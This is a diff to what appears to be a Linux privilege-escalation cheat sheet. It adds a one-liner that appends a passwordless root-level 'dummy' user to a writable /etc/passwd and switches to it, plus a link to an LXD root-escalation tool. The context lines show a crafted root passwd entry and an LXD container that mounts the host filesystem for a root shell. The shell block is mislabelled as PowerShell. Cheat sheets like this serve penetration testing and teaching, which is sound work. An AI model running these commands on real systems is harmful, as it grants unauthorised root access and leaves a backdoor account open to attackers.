@@ -384,6 +384,14 @@ E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
 You can now use the `su` command with `hacker:hacker`
 
+Alternatively you can use the following lines to add a dummy user without a password.    
+WARNING: you might degrade the current security of the machine.
+
+```powershell
+echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+su - dummy
+```
+
 
 ## NFS Root Squashing
 
@@ -525,6 +533,8 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
+
+Alternatively https://github.com/initstring/lxd_root
 
 ## References
 
